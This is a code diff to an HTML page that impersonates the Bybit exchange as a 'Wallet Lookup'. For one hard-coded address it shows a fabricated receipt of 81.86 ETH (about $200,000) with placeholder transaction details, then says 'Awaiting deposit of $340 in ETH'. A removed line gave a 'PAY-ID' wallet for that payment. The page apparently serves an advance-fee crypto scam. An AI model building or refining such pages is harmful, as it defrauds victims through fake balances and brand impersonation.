@@ -20,6 +20,7 @@
             --bybit-warning: #ffb600;
             --shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.15);
         }
+
         html, body {
             height: 100%;
             margin: 0;
@@ -27,6 +28,7 @@
             background: var(--bybit-dark);
             color: var(--bybit-white);
         }
+
         body {
             min-height: 100vh;
             width: 100vw;
@@ -35,6 +37,8 @@
             justify-content: center;
             align-items: center;
         }
+
+        /* Background image (Bybit style) */
         .bybit-bg {
             position: fixed;
             top: 0;
@@ -48,6 +52,7 @@
             user-select: none;
             transition: opacity 0.8s;
         }
+
         .container {
             background: var(--bybit-mid);
             border-radius: 26px;
@@ -61,6 +66,7 @@
             z-index: 1;
             overflow: hidden;
         }
+
         .logo-placeholder {
             width: 80px;
             height: 80px;
@@ -87,6 +93,7 @@
             letter-spacing: 1px;
             text-shadow: 0 1px 0 #181a20, 0 2px 12px rgba(249,210,101,0.06);
         }
+
         input[type="text"] {
             width: 100%;
             padding: 13px 14px;
@@ -103,6 +110,7 @@
         input[type="text"]:focus {
             border-color: var(--bybit-gold);
         }
+
         button {
             width: 100%;
             padding: 13px 0;
@@ -122,6 +130,7 @@
             background: linear-gradient(90deg, #ffe082 60%, var(--bybit-gold) 100%);
             transform: translateY(-1px) scale(1.02);
         }
+
         #wallet-info, #error-message {
             margin-top: 26px;
             animation: fadeIn 0.52s;
@@ -161,6 +170,7 @@
             background: var(--bybit-gold);
             color: #181a20;
         }
+
         .details {
             display: none;
             margin-top: 19px;
@@ -177,6 +187,7 @@
         .details strong {
             color: #eab543;
         }
+
         .awaiting-deposit {
             margin-top: 16px;
             color: var(--bybit-warning);
@@ -202,6 +213,7 @@
             font-weight: 700;
             font-size: 1.13rem;
         }
+        /* Extra Bybit border glow */
         .bybit-border-glow {
             position: absolute;
             top: -6px;
@@ -218,6 +230,7 @@
             0% { box-shadow: 0 0 0 0 #f9d265, 0 0 36px 6px #f9d26566, 0 0 100px 24px #f9d26518; }
             100% { box-shadow: 0 0 0 0 #f9d265, 0 0 48px 12px #f9d265aa, 0 0 120px 28px #f9d26522; }
         }
+
         @media (max-width: 500px) {
             .container {
                 padding: 22px 3vw 18px 3vw;
@@ -232,42 +245,42 @@
     </style>
 </head>
 <body>
-    <img src="IMG_0683.png" alt="Bybit background" class="bybit-bg" />
+    <!-- Bybit style background image (change src to your preferred Bybit-style SVG/jpg/png) -->
+    <img src="https://static.bybit.com/static/images/about/about-bg-1.svg" alt="Bybit background" class="bybit-bg" />
 
     <div class="container">
         <div class="bybit-border-glow"></div>
         <div class="logo-placeholder">
-            <img src="IMG_0682.jpeg" alt="Bybit Logo" />
+            <!-- Bybit logo, replace with your own if needed -->
+            <img src="https://cryptologos.cc/logos/bybit-bybit-logo.svg?v=029" alt="Bybit Logo" />
         </div>
-        <h1>Bybit Transaction Lookup</h1>
-        <input type="text" id="ethAddress" placeholder="Enter Ethereum Address">
-        <button id="lookupButton">Process Lookup</button>
+        <h1>Bybit Wallet Lookup</h1>
+        <input type="text" id="ethAddress" placeholder="Enter Ethereum Address" value="0x1AD36967ab3811104d23C1C1d997AB5743843A4F">
+        <button id="lookupButton">Lookup</button>
         
         <div id="wallet-info" style="display:none;">
             <div>
                 <span class="balance" id="balance">81.86</span> <span class="eth-label">ETH</span>
             </div>
             <div class="tx-label" id="shortAddr">Address: <span id="addressShort"></span></div>
-            <button id="viewDetailsButton" type="button">View Details</button>
+            <button id="viewDetailsButton">View Details</button>
             <div id="transactionDetails" class="details">
                 <p>Dear User, you’ve <strong>successfully received 81.86 ETH</strong> (approx. <strong>$200,000</strong>)</p>
                 <p>Transaction Time: <strong id="txTime"></strong></p>
-                <p>TXID: <strong>0x1234...cde442xxo</strong></p>
-                <p>From Address: <strong>etherscan.io</strong></p>
+                <p>TXID: <strong>0x1234...cdef</strong></p>
+                <p>From Address: <strong>0xabcdef...ef</strong></p>
             </div>
-            <div class="awaiting-deposit">
-                Awaiting deposit of <strong>$340.00</strong> in ETH.
+            <div class="awaiting-deposit" id="awaitingDeposit">
+                Awaiting deposit of <strong>$340</strong> in ETH.
             </div>
-        </div>
-        <div class="awaiting-deposit" style="margin-top:12px;">
-            PAY-ID <strong>0xe30Ac60E1bEBe1A23A3B16548067d062c78DEBC4</strong> Erc20!!.
         </div>
         <div id="error-message" style="display:none;">
             Sorry, this transaction doesn’t belong to you.
         </div>
     </div>
     <script>
-        const ALLOWED_ADDRESS = "0xa8dbd1dc0b300ebc6bad6c870d8d72db05b23692".toLowerCase();
+        // The only allowed address
+        const ALLOWED_ADDRESS = "0x1AD36967ab3811104d23C1C1d997AB5743843A4F".toLowerCase();
         const lookupBtn = document.getElementById('lookupButton');
         const walletInfo = document.getElementById('wallet-info');
         const errorMsg = document.getElementById('error-message');
@@ -277,6 +290,7 @@
         const addressShort = document.getElementById('addressShort');
         const txTime = document.getElementById('txTime');
 
+        // Helper to shorten ETH address
         function shortenAddress(addr) {
             if (!addr || addr.length < 10) return addr;
             return addr.slice(0, 6) + "..." + addr.slice(-4);
@@ -284,13 +298,15 @@
 
         lookupBtn.addEventListener('click', () => {
             const userAddress = ethAddress.value.trim().toLowerCase();
-            if (userAddress === ALLOWED_ADDRESS) {
+            if(userAddress === ALLOWED_ADDRESS) {
                 walletInfo.style.display = "block";
                 errorMsg.style.display = "none";
+                document.getElementById('balance').innerText = "81.86";
                 addressShort.innerText = shortenAddress(ethAddress.value.trim());
                 txTime.innerText = new Date().toLocaleString();
                 details.style.display = "none";
                 viewDetailsBtn.innerText = "View Details";
+                document.getElementById('awaitingDeposit').style.display = "block";
             } else {
                 walletInfo.style.display = "none";
                 errorMsg.style.display = "block";
@@ -311,12 +327,9 @@
             if(e.key === "Enter") lookupBtn.click();
         });
 
-        // Optional: On page load, clear wallet info and error
         window.addEventListener('DOMContentLoaded', () => {
-            walletInfo.style.display = "none";
-            errorMsg.style.display = "none";
-            details.style.display = "none";
-            viewDetailsBtn.innerText = "View Details";
+            addressShort.innerText = shortenAddress(ethAddress.value.trim());
+            txTime.innerText = new Date().toLocaleString();
         });
     </script>
 </body>
